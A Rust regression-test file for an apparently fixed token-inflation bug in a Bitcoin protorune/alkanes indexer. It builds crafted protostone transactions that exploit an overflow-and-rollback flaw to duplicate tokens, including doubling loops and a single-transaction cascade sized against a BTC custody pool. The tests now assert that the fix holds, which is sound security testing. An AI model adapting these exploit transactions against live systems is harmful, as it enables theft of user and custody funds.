//! Confirm-or-kill PoC for the "two stores, one rollback" protorune inflation bug.
//!
//! Root cause: `reconcile()` credits the pointer output in the NON-transactional
//! in-memory `proto_balances_by_output` map via `increase_balances_using_sheet`
//! -> `pipe()` -> `increase()`. The BTreeMap iterates ascending by
//! ProtoruneRuneId, so when a LOWER-id token is credited before a HIGHER-id token
//! whose `checked_add` overflows, the lower-id credit PERSISTS in the in-memory
//! map. `process_message` then catches the reconcile Err, calls
//! `refund_to_refund_pointer` (a no-op because the message vout was already
//! removed) and `atomic.rollback()` -- which only undoes the KV-store inventory
//! debit, NOT the in-memory pointer credit. `save_balances` then commits the
//! surviving credit, while the contract's inventory is restored => duplication.
//!
//! CASE 1 (ATTACK): pointer pre-loaded with C:MAX, message emits [V:x, C:1] where
//!   V (lower id) is a token C holds. V:x persists at the pointer AND in C's
//!   inventory => total V = 2x.
//! CASE 2 (ISOLATION CONTROL): identical 2-protostone tx + same C:MAX pre-load,
//!   but the message emits ONLY V:x (no C:1 overflow trigger) => reconcile Ok =>
//!   conservation (total V = x). The ONLY delta vs CASE 1 is the overflow trigger.
//! CASE 3 (SINGLE-TOKEN CONTROL): one token overflows on its first credit =>
//!   clean refund, conserved.

use crate::index_block;
use crate::message::AlkaneMessageContext;
use crate::tests::helpers as alkane_helpers;
use crate::tests::std::alkanes_std_test_build;
use alkane_helpers::clear;
use alkanes_support::cellpack::Cellpack;
use alkanes_support::id::AlkaneId;
use anyhow::Result;
use bitcoin::{
    address::NetworkChecked, transaction::Version, Address, Amount, OutPoint, ScriptBuf, Sequence,
    Transaction, TxIn, TxOut, Txid, Witness,
};
use std::str::FromStr;
use metashrew_core::index_pointer::IndexPointer;
#[allow(unused_imports)]
use metashrew_core::{
    println,
    stdio::{stdout, Write},
};
use metashrew_support::index_pointer::KeyValuePointer;
use metashrew_support::utils::consensus_encode;
use ordinals::Runestone;
use protorune::balance_sheet::load_sheet;
use protorune::message::MessageContext;
use protorune::protostone::Protostones;
use protorune::tables::RuneTable;
use protorune::test_helpers::{create_block_with_coinbase_tx, get_address, ADDRESS1};
use protorune_support::balance_sheet::{BalanceSheet, BalanceSheetOperations, ProtoruneRuneId};
use protorune_support::protostone::{Protostone, ProtostoneEdict};
use wasm_bindgen_test::wasm_bindgen_test;

const X: u128 = 1_000_000;

/// Read the COMMITTED (backing-store) balance sheet for a real-output outpoint.
fn outpoint_sheet(outpoint: &OutPoint) -> BalanceSheet<IndexPointer> {
    let ptr = RuneTable::for_protocol(AlkaneMessageContext::protocol_tag())
        .OUTPOINT_TO_RUNES
        .select(&consensus_encode(outpoint).unwrap());
    load_sheet(&ptr)
}

/// Discover the AlkaneId of the token self-minted to `outpoint` with exactly
/// `amount` units (the genesis alkane occupies (2,0), perturbing the deploy
/// sequence, so we do NOT hardcode (2,0)/(2,1)).
fn find_minted_id(outpoint: &OutPoint, amount: u128) -> AlkaneId {
    let sheet = outpoint_sheet(outpoint);
    let id = sheet
        .balances()
        .iter()
        .find(|(_, b)| **b == amount)
        .map(|(id, _)| *id)
        .unwrap_or_else(|| {
            panic!(
                "no token with balance {} at outpoint; sheet = {:?}",
                amount,
                sheet.balances()
            )
        });
    AlkaneId {
        block: id.block,
        tx: id.tx,
    }
}

fn rune_of(id: &AlkaneId) -> ProtoruneRuneId {
    ProtoruneRuneId {
        block: id.block,
        tx: id.tx,
    }
}

/// Read a contract's COMMITTED internal inventory balance of `token`.
/// Mirrors the key path built by `crate::utils::balance_pointer`:
///   /alkanes/ . select(token) . /balances/ . select(holder)
fn alkane_inventory(holder: AlkaneId, token: AlkaneId) -> u128 {
    let token_bytes: Vec<u8> = token.into();
    let holder_bytes: Vec<u8> = holder.into();
    IndexPointer::from_keyword("/alkanes/")
        .select(&token_bytes)
        .keyword("/balances/")
        .select(&holder_bytes)
        .get_value::<u128>()
}

/// Build a single transaction with TWO protostones:
///   P0: non-message (protocol_tag 1, pointer 0) -> routes the input's runes to
///       vout 0, pre-loading the pointer output.
///   P1: message (protocol_tag 1, pointer 0, refund 0) -> runs `msg_cellpack`.
fn build_two_protostone_attack_tx(preload_input: OutPoint, msg_cellpack: Cellpack) -> Transaction {
    let p0 = Protostone {
        burn: None,
        edicts: vec![],
        pointer: Some(0),
        refund: Some(0),
        from: None,
        message: vec![],
        protocol_tag: 1,
    };
    let p1 = Protostone {
        message: msg_cellpack.encipher(),
        pointer: Some(0),
        refund: Some(0),
        edicts: vec![],
        from: None,
        burn: None,
        protocol_tag: 1,
    };
    let runestone: ScriptBuf = (Runestone {
        etching: None,
        pointer: Some(0),
        edicts: Vec::new(),
        mint: None,
        protocol: vec![p0, p1].encipher().ok(),
    })
    .encipher();
    let op_return = TxOut {
        value: Amount::from_sat(0),
        script_pubkey: runestone,
    };

    let address: Address<NetworkChecked> = get_address(&ADDRESS1().as_str());
    let txout = TxOut {
        value: Amount::from_sat(100_000_000),
        script_pubkey: address.script_pubkey(),
    };
    Transaction {
        version: Version::ONE,
        lock_time: bitcoin::absolute::LockTime::ZERO,
        input: vec![TxIn {
            previous_output: preload_input,
            script_sig: ScriptBuf::new(),
            sequence: Sequence::MAX,
            witness: Witness::new(),
        }],
        output: vec![txout, op_return],
    }
}

/// Deploy two independent template instances V and C, self-mint V:x at V and
/// C:MAX at C, then DONATE V:x into C so C holds V:x in COMMITTED inventory.
/// Returns (V_id, C_id, outpoint holding C:MAX).
fn setup_v_c_with_donate() -> Result<(AlkaneId, AlkaneId, OutPoint)> {
    // Block 0: deploy V AND self-mint V:x in one tx. V:x lands at (block0.tx, 0).
    let block0 = alkane_helpers::init_with_multiple_cellpacks_with_tx(
        vec![alkanes_std_test_build::get_bytes()],
        vec![Cellpack {
            target: AlkaneId { block: 1, tx: 0 },
            inputs: vec![22, X],
        }],
    );
    index_block(&block0, 0)?;
    let mint_v_outpoint = OutPoint {
        txid: block0.txdata[block0.txdata.len() - 1].compute_txid(),
        vout: 0,
    };
    let v = find_minted_id(&mint_v_outpoint, X);

    // Block 1: deploy C AND self-mint C:MAX in one tx. (Sequence counter persists
    // across blocks -> C id > V id, as the bug requires.)
    let block1 = alkane_helpers::init_with_multiple_cellpacks_with_tx(
        vec![alkanes_std_test_build::get_bytes()],
        vec![Cellpack {
            target: AlkaneId { block: 1, tx: 0 },
            inputs: vec![22, u128::MAX],
        }],
    );
    index_block(&block1, 1)?;
    let mint_c_outpoint = OutPoint {
        txid: block1.txdata[block1.txdata.len() - 1].compute_txid(),
        vout: 0,
    };
    let c = find_minted_id(&mint_c_outpoint, u128::MAX);

    println!("[setup] discovered V = {:?}, C = {:?}", v, c);
    assert!(
        rune_of(&v) < rune_of(&c),
        "bug requires V (lower id, credited first) < C (higher id, overflows)"
    );

    // Block 2: donate V:x into C (opcode 7). C absorbs incoming V:x into inventory
    // and returns empty, so it KEEPS V:x (committed to the backing store).
    let mut block2 = create_block_with_coinbase_tx(0);
    let donate = alkane_helpers::create_multiple_cellpack_with_witness_and_in(
        Witness::new(),
        vec![Cellpack {
            target: c.clone(),
            inputs: vec![7],
        }],
        mint_v_outpoint,
        false,
    );
    block2.txdata.push(donate);
    index_block(&block2, 2)?;

    let c_holds_v = alkane_inventory(c.clone(), v.clone());
    println!(
        "[setup] AFTER donate: C committed inventory of V = {}",
        c_holds_v
    );
    assert_eq!(
        c_holds_v, X,
        "C must hold V:x in committed inventory before attack"
    );

    Ok((v, c, mint_c_outpoint))
}

#[wasm_bindgen_test]
fn test_inflation_case1_attack() -> Result<()> {
    clear();
    println!("=== CASE 1: ATTACK (expect inflation, total V = 2x) ===");
    let (v, c, c_max_outpoint) = setup_v_c_with_donate()?;

    // ATTACK: P0 routes C:MAX -> vout0 (pre-load), P1 message emits [V:x, C:1].
    // opcode 35 = forward(incoming) + pay(V:x from inventory) + pay(self C:1).
    let attack_tx = build_two_protostone_attack_tx(
        c_max_outpoint,
        Cellpack {
            target: c.clone(),
            inputs: vec![35, v.block, v.tx, X],
        },
    );
    let attack_txid = attack_tx.compute_txid();
    let mut block3 = create_block_with_coinbase_tx(0);
    block3.txdata.push(attack_tx);
    index_block(&block3, 3)?;

    let pointer_outpoint = OutPoint {
        txid: attack_txid,
        vout: 0,
    };
    let sheet = outpoint_sheet(&pointer_outpoint);
    let v_at_pointer = sheet.get_cached(&rune_of(&v));
    let c_at_pointer = sheet.get_cached(&rune_of(&c));
    let c_inv_v = alkane_inventory(c.clone(), v.clone());

    let total_v = v_at_pointer + c_inv_v;
    println!("--- CASE 1 committed results ---");
    println!("V ever minted               = {}", X);
    println!("V at pointer output (vout0) = {}", v_at_pointer);
    println!("C at pointer output (vout0) = {}", c_at_pointer);
    println!("V still in C inventory      = {}", c_inv_v);
    println!("TOTAL V in existence        = {}", total_v);
    println!(
        "NET_STOLEN (inflation)      = {}",
        total_v.saturating_sub(X)
    );

    // FIXED (v2.2.1): `pipe` is now all-or-nothing, so the C:MAX+1 overflow
    // aborts the message BEFORE any V is credited to the in-memory pointer
    // map. No partial credit survives the rollback => conservation.
    assert_eq!(
        v_at_pointer, 0,
        "FIXED: no partial V credit persists at the pointer output"
    );
    assert_eq!(c_inv_v, X, "rollback restored C's V:x inventory");
    assert_eq!(
        total_v, X,
        "CONSERVATION: total V == x (inflation fixed, NET_STOLEN = 0)"
    );
    Ok(())
}

#[wasm_bindgen_test]
fn test_inflation_case2_isolation_control() -> Result<()> {
    clear();
    println!("=== CASE 2: ISOLATION CONTROL (same pre-load, NO C:1 trigger) ===");
    let (v, c, c_max_outpoint) = setup_v_c_with_donate()?;

    // IDENTICAL structure to CASE 1 (same C:MAX pre-load at vout0), but the
    // message emits ONLY V:x (opcode 30 arb-mint, no self-mint) => no overflow
    // => reconcile Ok => conservation. The ONLY delta vs CASE 1 is the C:1 trigger.
    let attack_tx = build_two_protostone_attack_tx(
        c_max_outpoint,
        Cellpack {
            target: c.clone(),
            inputs: vec![30, v.block, v.tx, X],
        },
    );
    let attack_txid = attack_tx.compute_txid();
    let mut block3 = create_block_with_coinbase_tx(0);
    block3.txdata.push(attack_tx);
    index_block(&block3, 3)?;

    let pointer_outpoint = OutPoint {
        txid: attack_txid,
        vout: 0,
    };
    let sheet = outpoint_sheet(&pointer_outpoint);
    let v_at_pointer = sheet.get_cached(&rune_of(&v));
    let c_inv_v = alkane_inventory(c.clone(), v.clone());
    let total_v = v_at_pointer + c_inv_v;

    println!("--- CASE 2 committed results ---");
    println!("V ever minted               = {}", X);
    println!("V at pointer output (vout0) = {}", v_at_pointer);
    println!("V still in C inventory      = {}", c_inv_v);
    println!("TOTAL V in existence        = {}", total_v);

    assert_eq!(v_at_pointer, X, "reconcile Ok: V:x forwarded to pointer");
    assert_eq!(c_inv_v, 0, "no rollback: C's V:x inventory debited to 0");
    assert_eq!(total_v, X, "CONSERVATION: total V == x (no inflation)");
    Ok(())
}

#[wasm_bindgen_test]
fn test_inflation_case3_single_token_control() -> Result<()> {
    clear();
    println!("=== CASE 3: SINGLE-TOKEN CONTROL (overflow on first credit, clean) ===");

    // Block 0: deploy C AND self-mint C:MAX in one tx.
    let block0 = alkane_helpers::init_with_multiple_cellpacks_with_tx(
        vec![alkanes_std_test_build::get_bytes()],
        vec![Cellpack {
            target: AlkaneId { block: 1, tx: 0 },
            inputs: vec![22, u128::MAX],
        }],
    );
    index_block(&block0, 0)?;
    let mint_c_txid = block0.txdata[block0.txdata.len() - 1].compute_txid();
    let c = find_minted_id(
        &OutPoint {
            txid: mint_c_txid,
            vout: 0,
        },
        u128::MAX,
    );
    assert_eq!(
        outpoint_sheet(&OutPoint {
            txid: mint_c_txid,
            vout: 0
        })
        .get_cached(&rune_of(&c)),
        u128::MAX
    );

    // Block 2: attack with pointer pre-loaded C:MAX, message self-mints ONLY C:1.
    let attack_tx = build_two_protostone_attack_tx(
        OutPoint {
            txid: mint_c_txid,
            vout: 0,
        },
        Cellpack {
            target: c.clone(),
            inputs: vec![22, 1],
        },
    );
    let attack_txid = attack_tx.compute_txid();
    let mut block2 = create_block_with_coinbase_tx(0);
    block2.txdata.push(attack_tx);
    index_block(&block2, 2)?;

    let sheet = outpoint_sheet(&OutPoint {
        txid: attack_txid,
        vout: 0,
    });
    let c_at_pointer = sheet.get_cached(&rune_of(&c));
    println!("--- CASE 3 committed results ---");
    println!("C ever minted               = {}", u128::MAX);
    println!("C at pointer output (vout0) = {}", c_at_pointer);

    // single-token overflow => immediate refund, no partial credit survives.
    assert_eq!(
        c_at_pointer,
        u128::MAX,
        "single-token overflow refunds cleanly: pointer keeps exactly C:MAX (no inflation)"
    );
    Ok(())
}

/// A distinct empty-rune outpoint per call (used as a throwaway tx input for
/// self-mint txs). 64 hex chars => valid Txid; the indexer just loads an empty
/// rune sheet for it.
fn dummy_outpoint(n: u128) -> OutPoint {
    OutPoint {
        txid: Txid::from_str(&format!("{:064x}", n)).unwrap(),
        vout: 0,
    }
}

/// Mint a FRESH outpoint bearing exactly C:MAX by calling C opcode 22
/// (TestSelfMint, uncapped self-mint). Returns the outpoint holding C:MAX.
fn mint_fresh_c_max(c: &AlkaneId, input: OutPoint, height: u32) -> Result<OutPoint> {
    let tx = alkane_helpers::create_multiple_cellpack_with_witness_and_in(
        Witness::new(),
        vec![Cellpack {
            target: c.clone(),
            inputs: vec![22, u128::MAX],
        }],
        input,
        false,
    );
    let txid = tx.compute_txid();
    let mut block = create_block_with_coinbase_tx(0);
    block.txdata.push(tx);
    index_block(&block, height)?;
    Ok(OutPoint { txid, vout: 0 })
}

/// Split a `[V:hold, C:MAX]` outpoint: a single non-message protostone whose
/// edict forwards ALL of token C to vout1 (discarded) while the leftover V:hold
/// falls through to the pointer (vout0). Result: vout0 holds ONLY V:hold.
fn build_split_tx(input: OutPoint, c: &AlkaneId) -> Transaction {
    let stone = Protostone {
        burn: None,
        message: vec![],
        edicts: vec![ProtostoneEdict {
            id: ProtoruneRuneId {
                block: c.block,
                tx: c.tx,
            },
            amount: 0, // 0 => transfer the whole C balance
            output: 1, // -> vout1 (real output, kept but ignored)
        }],
        pointer: Some(0),
        refund: Some(0),
        from: None,
        protocol_tag: 1,
    };
    let runestone: ScriptBuf = (Runestone {
        etching: None,
        pointer: Some(0),
        edicts: Vec::new(),
        mint: None,
        protocol: vec![stone].encipher().ok(),
    })
    .encipher();
    let op_return = TxOut {
        value: Amount::from_sat(0),
        script_pubkey: runestone,
    };
    let address: Address<NetworkChecked> = get_address(&ADDRESS1().as_str());
    let txout0 = TxOut {
        value: Amount::from_sat(100_000_000),
        script_pubkey: address.script_pubkey(),
    };
    let txout1 = TxOut {
        value: Amount::from_sat(546),
        script_pubkey: address.script_pubkey(),
    };
    Transaction {
        version: Version::ONE,
        lock_time: bitcoin::absolute::LockTime::ZERO,
        input: vec![TxIn {
            previous_output: input,
            script_sig: ScriptBuf::new(),
            sequence: Sequence::MAX,
            witness: Witness::new(),
        }],
        output: vec![txout0, txout1, op_return],
    }
}

/// TEST_CROSS_TX_DOUBLING
/// Each round: (1) mint a fresh C:MAX preload outpoint, (2) run ONE opcode-35
/// two-protostone attack emitting V:hold (hold = C's current committed
/// inventory of V) so the pointer output retains V:hold while C's inventory is
/// restored to hold, (3) DONATE (opcode 7) the pointer's V:hold back into C so
/// C's committed inventory grows to 2*hold. Each tx is indexed in its own block.
/// The committed inventory therefore follows X * 2^round.
#[wasm_bindgen_test]
fn test_cross_tx_doubling() -> Result<()> {
    clear();
    println!("=== TEST_CROSS_TX_DOUBLING (geometric committed-inventory growth) ===");
    let (v, c, _c_max_outpoint) = setup_v_c_with_donate()?;

    let initial = alkane_inventory(c.clone(), v.clone());
    assert_eq!(initial, X, "setup leaves C holding V:X committed");
    println!("round {:>2} -> C committed inventory of v = {}", 0, initial);

    const ROUNDS: u32 = 16;
    let mut height: u32 = 3; // setup consumed blocks 0,1,2
    let mut dummy_n: u128 = 0xa11a_0000_0000;

    for round in 1..=ROUNDS {
        // hold = C's current committed inventory of V == X * 2^(round-1)
        let hold = alkane_inventory(c.clone(), v.clone());

        // (1) fresh C:MAX preload source
        let cmax = mint_fresh_c_max(&c, dummy_outpoint(dummy_n), height)?;
        dummy_n += 1;
        height += 1;

        // (2) opcode-35 two-protostone attack: emits [V:hold, C:1]
        let attack_tx = build_two_protostone_attack_tx(
            cmax,
            Cellpack {
                target: c.clone(),
                inputs: vec![35, v.block, v.tx, hold],
            },
        );
        let attack_txid = attack_tx.compute_txid();
        let mut ablock = create_block_with_coinbase_tx(0);
        ablock.txdata.push(attack_tx);
        index_block(&ablock, height)?;
        height += 1;
        let pointer_outpoint = OutPoint {
            txid: attack_txid,
            vout: 0,
        };

        // (3) SPLIT: edict all C:MAX off to vout1 (discarded), leaving ONLY V:hold
        // at vout0. This keeps C entirely out of the donate's incoming, so the
        // protocol RUNTIME balance never accumulates C:MAX (which would otherwise
        // overflow on the next donate's `runtime + incoming` merge).
        let split_tx = build_split_tx(pointer_outpoint, &c);
        let split_txid = split_tx.compute_txid();
        let mut sblock = create_block_with_coinbase_tx(0);
        sblock.txdata.push(split_tx);
        index_block(&sblock, height)?;
        height += 1;
        let v_only_outpoint = OutPoint {
            txid: split_txid,
            vout: 0,
        };

        // (4) donate the V-only outpoint into C: credit_balances doubles C's
        // committed inventory of V.
        let donate_tx = alkane_helpers::create_multiple_cellpack_with_witness_and_in(
            Witness::new(),
            vec![Cellpack {
                target: c.clone(),
                inputs: vec![7],
            }],
            v_only_outpoint,
            false,
        );
        let mut dblock = create_block_with_coinbase_tx(0);
        dblock.txdata.push(donate_tx);
        index_block(&dblock, height)?;
        height += 1;

        let inv = alkane_inventory(c.clone(), v.clone());
        println!("round {:>2} -> C committed inventory of v = {}", round, inv);
        // FIXED (v2.2.1): the attack no longer doubles — the overflow aborts the
        // message with no surviving partial credit, so C's committed inventory of
        // V stays exactly X every round (no geometric inflation).
        assert_eq!(
            inv, X,
            "FIXED round {}: inventory conserved at X (no doubling)",
            round
        );
    }

    // doublings needed to reach the 90.13 BTC frBTC custody (base units)
    let target: u128 = 9_013_000_000;
    let mut m_from_x = 0u32;
    while X.checked_mul(1u128 << m_from_x).unwrap() < target {
        m_from_x += 1;
    }
    let mut m_from_1 = 0u32;
    while (1u128 << m_from_1) < target {
        m_from_1 += 1;
    }
    println!("--- thresholds ---");
    println!(
        "smallest M doublings with X*2^M >= {} (seed X={}) : {}",
        target, X, m_from_x
    );
    println!(
        "smallest M doublings with 2^M >= {} (seed 1)       : {}",
        target, m_from_1
    );
    Ok(())
}

/// Build ONE Bitcoin transaction whose protostones CASCADE k doublings, with a
/// SINGLE C:MAX token that CIRCULATES (the end-of-tx `index_unique_protorunes`
/// fold sums token C across all output sheets, so only ONE C:MAX may exist at
/// tx end -- parking one per doubling overflows MAX+MAX).
///
/// Protostone order: [M, A_0,S_0,D_0, A_1,S_1,D_1, ...], shadow vout = 3+index.
///   M  (opcode 22): mint C:MAX once -> site_0 (overflow site of doubling 0).
/// Per doubling j (0-indexed), site_j = S_j shadow = 5+3j:
///   A_j (opcode 35): emit [V:(X<<j), C:1] -> pointer = site_j; C:1 overflows the
///                    preloaded C:MAX while V:(X<<j) survives at site_j.
///   S_j (edicts)   : non-message; edict forwards ALL C:MAX -> site_{j+1} (REUSE
///                    as next attack's preload); leftover V:(X<<j) -> D_j shadow.
///   D_j (opcode 7) : absorbs ONLY V:(X<<j); credit_balances grows C's committed
///                    V-inventory by (X<<j), doubling it. C never enters a donate
///                    incoming, so the RUNTIME balance never accumulates C.
/// One atomic is shared across protostones, so each donate's commit is visible to
/// the next attack's debit -> each attack emits the freshly-doubled amount.
fn build_cascade_tx(v: &AlkaneId, c: &AlkaneId, input: OutPoint, k: u32) -> Transaction {
    // tx has [txout(0), op_return(1)] => shadow vout(index) = 2 + 1 + index.
    let site = |j: u32| -> u32 { 5 + 3 * j }; // S_j shadow vout = overflow site_j
    let d_shadow = |j: u32| -> u32 { 6 + 3 * j }; // D_j shadow vout
    let mut stones: Vec<Protostone> = Vec::new();
    // M: single mint of C:MAX -> site_0
    stones.push(Protostone {
        message: Cellpack {
            target: c.clone(),
            inputs: vec![22, u128::MAX],
        }
        .encipher(),
        pointer: Some(site(0)),
        refund: Some(0),
        edicts: vec![],
        from: None,
        burn: None,
        protocol_tag: 1,
    });
    for j in 0..k {
        // A_j: attack -> pointer = site_j (preloaded C:MAX)
        stones.push(Protostone {
            message: Cellpack {
                target: c.clone(),
                inputs: vec![35, v.block, v.tx, X << j],
            }
            .encipher(),
            pointer: Some(site(j)),
            refund: Some(0),
            edicts: vec![],
            from: None,
            burn: None,
            protocol_tag: 1,
        });
        // S_j: non-message; forward C:MAX -> site_{j+1}, leftover V -> D_j shadow
        stones.push(Protostone {
            message: vec![],
            pointer: Some(d_shadow(j)),
            refund: Some(d_shadow(j)),
            edicts: vec![ProtostoneEdict {
                id: ProtoruneRuneId {
                    block: c.block,
                    tx: c.tx,
                },
                amount: 0,
                output: site(j + 1) as u128,
            }],
            from: None,
            burn: None,
            protocol_tag: 1,
        });
        // D_j: donate, absorb V:(X<<j) into C's committed inventory (doubling)
        stones.push(Protostone {
            message: Cellpack {
                target: c.clone(),
                inputs: vec![7],
            }
            .encipher(),
            pointer: Some(0),
            refund: Some(0),
            edicts: vec![],
            from: None,
            burn: None,
            protocol_tag: 1,
        });
    }
    let runestone: ScriptBuf = (Runestone {
        etching: None,
        pointer: Some(0),
        edicts: Vec::new(),
        mint: None,
        protocol: stones.encipher().ok(),
    })
    .encipher();
    let op_return = TxOut {
        value: Amount::from_sat(0),
        script_pubkey: runestone,
    };
    let address: Address<NetworkChecked> = get_address(&ADDRESS1().as_str());
    let txout = TxOut {
        value: Amount::from_sat(100_000_000),
        script_pubkey: address.script_pubkey(),
    };
    Transaction {
        version: Version::ONE,
        lock_time: bitcoin::absolute::LockTime::ZERO,
        input: vec![TxIn {
            previous_output: input,
            script_sig: ScriptBuf::new(),
            sequence: Sequence::MAX,
            witness: Witness::new(),
        }],
        output: vec![txout, op_return],
    }
}

/// TEST_SINGLE_TX_MULTI_DOUBLING (best case)
/// Scan k = number of cascaded doublings packed into ONE transaction. For each k
/// we use a fresh deploy + setup, index a single cascade tx in one block, and
/// check C's committed V-inventory == X * 2^k (full cascade). Report the max k
/// that fully cascades and the factor that bounds it.
#[wasm_bindgen_test]
fn test_single_tx_multi_doubling() -> Result<()> {
    println!("=== TEST_SINGLE_TX_MULTI_DOUBLING (cascade within one tx) ===");
    // 1 mint + 3 protostones per doubling; last message shadow vout = 3k+3 must
    // stay < num_outputs+100 = 102  => k <= 32. Scan a bit past the ceiling.
    const K_SCAN_MAX: u32 = 34;
    let mut max_full_k: u32 = 0;
    let mut bound_reason = String::from("not reached within scan");

    for k in 1..=K_SCAN_MAX {
        clear();
        let (v, c, _c_max) = setup_v_c_with_donate()?;
        // pre-state: C holds V:X committed
        let cascade_tx = build_cascade_tx(&v, &c, dummy_outpoint(0xC0DE), k);
        let mut block = create_block_with_coinbase_tx(0);
        block.txdata.push(cascade_tx);
        // a single tx in a single block performs k doublings
        let idx = index_block(&block, 3);
        let inv = alkane_inventory(c.clone(), v.clone());
        let expected = X.checked_mul(1u128 << k).unwrap();
        let full = idx.is_ok() && inv == expected;
        println!(
            "k={:>2} protostones={:>3} last_shadow_vout={:>3} -> C inv v = {:<25} expected {:<25} full={}",
            k,
            1 + 3 * k,
            3 * k + 3,
            inv,
            expected,
            full
        );
        if full {
            max_full_k = k;
        } else {
            // classify what stopped the cascade at this k
            if 3 * k + 3 >= num_outputs_plus_100() {
                bound_reason = format!(
                    "num_outputs+100 virtual-vout ceiling (last shadow vout {} >= 102)",
                    3 * k + 3
                );
            } else if idx.is_err() {
                bound_reason = format!("index error at k={}: {:?}", k, idx.err());
            } else {
                bound_reason = format!(
                    "fuel / per-message failure at k={} (got {} of expected {})",
                    k, inv, expected
                );
            }
            break;
        }
    }

    println!("--- single-tx cascade result ---");
    println!("max doublings in ONE tx (full cascade) = {}", max_full_k);
    println!(
        "max total V minted in one tx = X*(2^{} - 1) = {}",
        max_full_k,
        X.checked_mul((1u128 << max_full_k) - 1).unwrap()
    );
    println!("limiting factor (cascade, not linear) = {}", bound_reason);

    // FIXED (v2.2.1): not a single doubling cascades — the all-or-nothing
    // `pipe` blocks the overflow-driven duplication, so max_full_k stays 0.
    assert_eq!(
        max_full_k, 0,
        "FIXED: no doubling cascades within a single tx (inflation blocked)"
    );
    Ok(())
}

fn num_outputs_plus_100() -> u32 {
    2 + 100
}

